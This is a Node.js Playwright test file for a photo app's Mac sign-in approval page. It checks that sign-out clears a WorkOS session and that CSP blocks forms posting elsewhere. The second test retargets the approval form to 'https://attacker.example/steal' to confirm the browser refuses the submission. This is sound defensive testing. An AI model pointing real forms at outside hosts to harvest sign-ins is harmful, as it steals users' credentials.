import assert from "node:assert/strict"
import { generateKeyPairSync, sign } from "node:crypto"
import { createServer } from "node:http"
import { after, before, test } from "node:test"
import { sealData } from "iron-session"
import { handleAccountApproval } from "../lib/account-pairing.ts"
import { handleAccountLogout } from "../lib/license-admin-auth.ts"

const { chromium } = await import(
  process.env.PHOTODEPOT_TEST_PLAYWRIGHT_MODULE || "@playwright/test"
)
const clientId = "client_logout_browser"
const userId = "user_logout_browser"
const sessionId = "session_logout_browser"
const password = "logout-browser-cookie-secret-at-least-32-characters"
const pairingCode = "A".repeat(43)
const rsa = generateKeyPairSync("rsa", { modulusLength: 2048 })
const jwk = {
  ...rsa.publicKey.export({ format: "jwk" }),
  kid: "logout-key",
  alg: "RS256",
  use: "sig",
}
let browser, server, hostedServer, origin, hostedOrigin, env, originalFetch
let logoutOrigin
let hostedSessionClears = 0

function jwt() {
  const header = Buffer.from(
    JSON.stringify({ alg: "RS256", kid: jwk.kid })
  ).toString("base64url")
  const payload = Buffer.from(
    JSON.stringify({
      iss: "https://api.workos.com",
      client_id: clientId,
      sub: userId,
      sid: sessionId,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 300,
    })
  ).toString("base64url")
  return `${header}.${payload}.${sign("RSA-SHA256", Buffer.from(`${header}.${payload}`), rsa.privateKey).toString("base64url")}`
}

before(async () => {
  originalFetch = globalThis.fetch
  globalThis.fetch = async (input) => {
    const url = String(input)
    if (url === `https://api.workos.com/sso/jwks/${clientId}`)
      return Response.json({ keys: [jwk] })
    assert.equal(url, `https://api.workos.com/user_management/users/${userId}`)
    return Response.json({
      id: userId,
      email: "customer@example.test",
      email_verified: true,
    })
  }
  hostedServer = createServer((incoming, outgoing) => {
    assert.equal(incoming.url, "/clear-session")
    hostedSessionClears++
    outgoing.writeHead(302, { location: `${origin}/` })
    outgoing.end()
  })
  await new Promise((resolve, reject) => {
    hostedServer.once("error", reject)
    hostedServer.listen(0, "127.0.0.1", resolve)
  })
  hostedOrigin = `http://127.0.0.1:${hostedServer.address().port}`
  server = createServer(async (incoming, outgoing) => {
    try {
      const request = new Request(`${origin}${incoming.url}`, {
        method: incoming.method,
        headers: incoming.headers,
      })
      let response
      if (new URL(request.url).pathname === "/account/activate") {
        response = await handleAccountApproval(request, env)
      } else if (new URL(request.url).pathname === "/api/account/auth/logout") {
        logoutOrigin = request.headers.get("origin")
        response = await handleAccountLogout(request, env)
      } else {
        response = new Response("Signed out of Photodepot and WorkOS.")
      }
      outgoing.writeHead(response.status, {
        ...Object.fromEntries(response.headers),
        "set-cookie": response.headers.getSetCookie(),
      })
      outgoing.end(await response.text())
    } catch (error) {
      outgoing.writeHead(500)
      outgoing.end(String(error))
    }
  })
  await new Promise((resolve, reject) => {
    server.once("error", reject)
    server.listen(0, "127.0.0.1", resolve)
  })
  origin = `http://127.0.0.1:${server.address().port}`
  env = {
    WORKOS_CLIENT_ID: clientId,
    WORKOS_COOKIE_PASSWORD: password,
    WORKOS_REDIRECT_URI: `${origin}/api/auth/callback`,
    WORKOS_API_KEY: "sk_browser_fixture",
    DB: {
      prepare(sql) {
        return {
          bind() {
            return this
          },
          async first() {
            if (sql.includes("FROM account_pairings"))
              return {
                account_version: 1,
                token_hash: "b".repeat(64),
                status: "pending",
                expires_at: Date.now() + 60_000,
                device_id: "a".repeat(64),
                device_name: "Test MacBook",
              }
            assert.fail(`Unexpected fixture query: ${sql}`)
          },
          async all() {
            assert.match(sql, /FROM desktop_sessions/)
            return { results: [] }
          },
        }
      },
    },
  }
  browser = await chromium.launch({
    channel: process.env.PHOTODEPOT_TEST_BROWSER_CHANNEL || undefined,
  })
})

after(async () => {
  globalThis.fetch = originalFetch
  await browser?.close()
  await new Promise((resolve) => server?.close(resolve))
  await new Promise((resolve) => hostedServer?.close(resolve))
})

async function customerPage(t) {
  const context = await browser.newContext()
  t.after(() => context.close())
  const value = await sealData(
    {
      version: 1,
      audience: "account",
      clientId,
      origin,
      accessToken: jwt(),
      refreshToken: "test-refresh-token",
      user: { id: userId, email: "customer@example.test", emailVerified: true },
    },
    { password, ttl: 604800 }
  )
  await context.addCookies([
    {
      name: "photodepot-account",
      value,
      url: origin,
      httpOnly: true,
      sameSite: "Lax",
    },
  ])
  const page = await context.newPage()
  return { context, page }
}

test("Mac approval sign-out clears the hosted session through its cross-origin redirect chain", async (t) => {
  const { context, page } = await customerPage(t)
  const hostedRequests = []
  const cspErrors = []
  page.on("console", (message) => {
    if (message.text().includes("form-action")) cspErrors.push(message.text())
  })
  // Intercept all external traffic: the browser executes real redirects but
  // never contacts WorkOS or modifies a production session.
  await context.route("https://**/*", async (route) => {
    const url = new URL(route.request().url())
    hostedRequests.push(url.href)
    if (url.origin === "https://api.workos.com") {
      assert.equal(url.pathname, "/user_management/sessions/logout")
      assert.equal(url.searchParams.get("session_id"), sessionId)
      assert.equal(url.searchParams.get("return_to"), `${origin}/`)
      await route.fulfill({
        status: 302,
        headers: { location: `${hostedOrigin}/clear-session` },
      })
    } else {
      await route.abort()
    }
  })
  await page.goto(`${origin}/account/activate?code=${pairingCode}`)
  assert.equal(await page.locator("h1").innerText(), "Continue signing in")
  assert.match(await page.locator("main").innerText(), /Test MacBook/)
  assert.equal(
    await page
      .getByRole("button", { name: "Approve computer sign-in", exact: true })
      .count(),
    1
  )
  await page
    .getByRole("button", { name: "Sign out", exact: true })
    .click({ noWaitAfter: true })
  await page.waitForURL(`${origin}/`, { timeout: 5000 }).catch((error) => {
    throw new Error(`${error.message}\nCSP errors: ${cspErrors.join("\n")}`)
  })
  assert.equal(hostedRequests.length, 1)
  assert.equal(hostedSessionClears, 1)
  assert.equal(logoutOrigin, origin)
  assert.deepEqual(cspErrors, [])
  assert.equal(
    (await context.cookies(origin)).some(
      (cookie) => cookie.name === "photodepot-account"
    ),
    false
  )
})

test("Mac approval still prevents forms from submitting to another origin", async (t) => {
  const { context, page } = await customerPage(t)
  let externalRequests = 0
  await context.route("https://**/*", async (route) => {
    externalRequests++
    await route.abort()
  })
  await page.goto(`${origin}/account/activate?code=${pairingCode}`)
  assert.equal(await page.locator("h1").innerText(), "Continue signing in")
  const violation = page.waitForEvent("console", {
    timeout: 5000,
    predicate: (message) => message.text().includes("form-action"),
  })
  await page.locator('form[action^="/account/activate?"]').evaluate((form) => {
    form.action = "https://attacker.example/steal"
  })
  await page
    .getByRole("button", { name: "Approve computer sign-in", exact: true })
    .click({ noWaitAfter: true })
  await violation
  assert.equal(externalRequests, 0)
})
